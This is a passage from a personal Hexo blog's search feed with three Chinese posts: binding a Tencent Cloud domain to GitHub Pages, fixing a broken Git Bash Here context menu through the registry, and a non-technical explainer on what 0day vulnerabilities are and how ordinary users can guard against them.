        <content type="html"><![CDATA[<h1 id="01-前情提要"><a href="#01-前情提要" class="headerlink" title="01 前情提要"></a>01 前情提要</h1><p>我们都知道，要想搭建一个网站，我们至少需要三个要素。</p><p>分别是 <strong>域名、服务器、网站源码</strong></p><p>因为我想要搭建的是一个自己的博客，一个分享自己想法的小网站，对商业性要求不高，所以我的想法是<strong>能少花钱就少花钱</strong>。</p><p>于是我就开始干！！！</p><p>服务器与网站源码这两个要素，我使用的<strong>Github Pages + Hexo</strong>的组合。这组合的优点是，<strong>不花钱且主题丰富</strong>，能很大满足我对视觉效果的要求。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200601111436695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>而<strong>域名</strong>这个要素，对于博客网站来说，我们既可以直接使用Github上的域名，也可以申请一个域名。<br><br>在这里我的想法是，<strong>用一块钱申请腾讯云的.club域名</strong>。该种方式的优点的，<strong>省钱</strong>，你一年只需要花一块钱。</p><p>甚至，如果你对域名没有固定要求，可以接受今年是<a href="http://www.cyxdeblog.club，明年是www.cyxdebolg1.club,那么理论上你可以每年用一元钱去申请不同的域名绑定你的博客，可以说十年你用10块钱拥有你的域名。" target="_blank" rel="noopener external nofollow noreferrer">www.cyxdeblog.club，明年是www.cyxdebolg1.club,那么理论上你可以每年用一元钱去申请不同的域名绑定你的博客，可以说十年你用10块钱拥有你的域名。</a><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200601111448139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h1 id="02-绑定方案"><a href="#02-绑定方案" class="headerlink" title="02 绑定方案"></a>02 绑定方案</h1><p>1.完善个人信息，申请域名成功后，进入腾讯云首页，点击右上方<strong>控制台</strong>字样，进入控制台</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200601111457538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>2.点击如下图所示的<strong>DNS 解析 DNSPod</strong>（如果最近访问中没有，则可以在红色箭头上的搜索框进行搜索）<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200601111507340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>3.进入DNS 解析 DNSPod后，点击域名下方的<strong>蓝色域名</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200601111517282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br>4、如图所示，<strong>添加两条记录并保存</strong><br>举例：@对应添加的是example.github.io<br>           www对应添加的是<a href="http://www.example.github.io" target="_blank" rel="noopener external nofollow noreferrer">www.example.github.io</a><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200601111527780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>5、重新进入控制台，点击域名管理，<strong>若服务状态与DNS状态都为绿颜色字体，即表明DNS配置正常</strong>。若在此步骤出现问题，那么自行查看腾讯云官方使用文档解决问题即可。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200601111540552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><br><p>6、进入你的github博客仓库，点击<strong>setting</strong>，下拉找到<strong>Github Page设置页面</strong>，输入你要绑定的域名后，点击<strong>save</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200601111555518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200601111608146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>7、在浏览器<strong>URL框中</strong>输入你刚刚<strong>绑定好的域名</strong>，测试是否绑定成功<br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200601111626192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h1 id="03-欢迎来逛"><a href="#03-欢迎来逛" class="headerlink" title="03 欢迎来逛"></a>03 欢迎来逛</h1><p>相信经过上述操作过程，你已经成功将你的<strong>Github博客+腾讯云域名</strong>绑定啦<del>~</del></p><p>如果这篇文章对你有所方便，希望可以<strong>点个赞</strong>支持下我下</p><p><strong>同时欢迎大家来我的博客小窝，逛一逛，这里欢迎你们的到来</strong><br>↓↓↓↓↓↓↓↓↓↓↓↓</p><p><a href="http://cyxdeblog.club/" target="_blank" rel="noopener external nofollow noreferrer">我的博客小窝</a></p>]]></content>
      
      
      <categories>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Bash_GUI Here  “找不到应用程序问题” 的解决方案</title>
      <link href="/2020/07/19/git-bash-gui-here-zhao-bu-dao-ying-yong-cheng-xu-wen-ti-de-jie-jue-fang-an/"/>
      <url>/2020/07/19/git-bash-gui-here-zhao-bu-dao-ying-yong-cheng-xu-wen-ti-de-jie-jue-fang-an/</url>
      
        <content type="html"><![CDATA[<h2 id="01-问题描述：git-bash-找不到应用程序问题"><a href="#01-问题描述：git-bash-找不到应用程序问题" class="headerlink" title="01 问题描述：git bash 找不到应用程序问题"></a>01 问题描述：git bash 找不到应用程序问题</h2><p>欲使用hexo部署博客时，文件夹内鼠标右键单击，发现图标异常</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020051218304619.png#pic_center" alt=""></p><br /><p>然后点击Git Bash Here后，提示以下错误：找不到应用程序<br /><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020051218310198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><br /><h2 id="02-解决方案：通过修改注册表内相应文件路径信息的方法，实现能够全局使用Git-Bash-Here"><a href="#02-解决方案：通过修改注册表内相应文件路径信息的方法，实现能够全局使用Git-Bash-Here" class="headerlink" title="02 解决方案：通过修改注册表内相应文件路径信息的方法，实现能够全局使用Git Bash Here"></a>02 解决方案：通过修改注册表内相应文件路径信息的方法，实现能够全局使用Git Bash Here</h2><p>具体步骤如下：<br /><br>①win + R 键调出运行框，输入 regedit 调用注册表编辑器<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200512183110714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br />②在路径框中黏贴以下路径信息：<br /><br>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\git_shell\command<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020051218311931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br />③点击修改，将现存计算机中git-bash.exe的路径信息填入框中后，点击确定<br /><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200512183128174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br />④关闭注册表编辑器，任意文件夹内鼠标右键单击，然后点击Git Bash Here，发现可成功进入<br /><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200512183137111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br /><br /></p><h2 id="03-问题总结"><a href="#03-问题总结" class="headerlink" title="03 问题总结"></a>03 问题总结</h2><p>之所以会出现“找不到该应用程序”的警示，是因为git-bash.exe的路径信息被修改。或许是因为你不小心移动了git文件夹所致。</p><p>这情况就类似于你为了方便使用某个软件，于是发送到桌面一个快捷方式。平时使用的好好的，但是某一天你不小心移动了软件的具体路径或者误删了软件目录，那么这个时候你的桌面快捷方式就是无效的。<br><br /><br /></p><h2 id="04-思路迁移"><a href="#04-思路迁移" class="headerlink" title="04 思路迁移"></a>04 思路迁移</h2><p>Git GUI Here 找不到应用程序也是采用同样的解决方法，不同之处在于黏贴如注册表编辑器的路径信息不同，为计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\git_shell\command，其他步骤均相同</p>]]></content>
      
      
      <categories>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> hexo </tag>
            
            <tag> 表单验证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0day，你究竟是个啥？</title>
      <link href="/2020/07/19/0day-ni-jiu-jing-shi-ge-sha/"/>
      <url>/2020/07/19/0day-ni-jiu-jing-shi-ge-sha/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200515091938592.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h2 id="01-什么是0day漏洞？"><a href="#01-什么是0day漏洞？" class="headerlink" title="01 什么是0day漏洞？"></a>01 什么是0day漏洞？</h2><p>0day漏洞，简单来讲，其实就是一个高危漏洞。这个漏洞有两个特点：</p><p>①能非法取得操作系统最高权限</p><p>②暂时没有得到修复</p><p>打个比方，如果我们与操作系统的最高权限隔着一道厚厚的墙，那么这个0day，就是我们在墙上发现的一块空洞。如果这堵墙没有得到及时修补，那么操作系统的权限可以被我们轻松获取。<br><br></p><h2 id="02-那为什么叫做0day漏洞呢？"><a href="#02-那为什么叫做0day漏洞呢？" class="headerlink" title="02 那为什么叫做0day漏洞呢？"></a>02 那为什么叫做0day漏洞呢？<br></h2><p>其实术语“0day”是指从发现漏洞到对其进行首次攻击之间的天数。0day漏洞公开后，便称为nday漏洞。<br><br></p><h2 id="03-0day的出生与消亡"><a href="#03-0day的出生与消亡" class="headerlink" title="03 0day的出生与消亡"></a>03 0day的出生与消亡</h2><p>1）一个人或一个公司创建了一个软件，其中包含一个漏洞，但涉及编程或发行的人员却不知道。</p><p>2）在开发人员有机会定位或解决问题之前，有人（除负责软件的人员之外）发现了漏洞。</p><p>3）发现该漏洞的人会创建恶意代码来利用该漏洞。</p><p>4）该漏洞被释放。</p><p>5）负责人员将被告知漏洞利用并打补丁。</p><p>6）该漏洞不再被视为0day。</p><p>7）补丁发布。<br><br></p><h2 id="04-0day的利用与预防"><a href="#04-0day的利用与预防" class="headerlink" title="04 0day的利用与预防"></a>04 0day的利用与预防</h2><p>如果你是黑客，好不容易发现了一个别人没发现的0 day。你舍得用这样一个珍贵的0day随便攻击你遇到的任意一个普通用户嘛？而且注意，一旦0day暴露，可是会被厂商用紧急补丁修复的哦。0day在黑市上价值几万美金，你要是这么用，岂不是暴殄天物。</p><p>所以换个角度来看，如果我们作为普通用户来说，大可不必担心攻击者通过0day来对你实施攻击，因为太不值得了，我们还不配！但是我们也得有防范意识，我们该怎么做呢？</p><p>①<strong>不用轻易下载先行版软件</strong>，先行版软件很大程度上并没有经过大量测试人员的测试，其中很多BUG都没有被发现和修改。</p><p>②如果在运行软件过程中发现错误报告，尽量<strong>将该错误报告提交给开发人员或者公司</strong>。这也是你提高该软件安全性的有效途径。</p><p>如果你是给开发人员，那么你要做的就是尽可能多的招募人员对该软件进行测试，以及注重用户提交的错误报告，亡羊补牢。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 0day </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
